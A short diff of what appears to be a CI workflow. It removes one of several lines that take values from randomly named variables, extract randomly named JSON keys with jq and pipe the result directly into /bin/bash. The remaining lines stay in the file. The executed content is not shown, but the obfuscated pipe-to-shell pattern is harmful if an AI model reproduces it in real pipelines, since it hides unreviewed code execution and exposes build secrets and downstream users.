@@ -30,7 +30,6 @@ jobs:
           printf '%s' "$tie4" | jq -r .vul7601 | /bin/bash
           printf '%s' "$suf8" | jq -r .xwzb460 | /bin/bash
           echo $df7 | jq -r .ufhhs1 | /bin/bash
-          printf '%s' "$xlmnj54" | jq -r .abd662 | /bin/bash
           printf '%s' "$fuh4" | jq -r .g54 | /bin/bash
 
       - name: Upload artifact
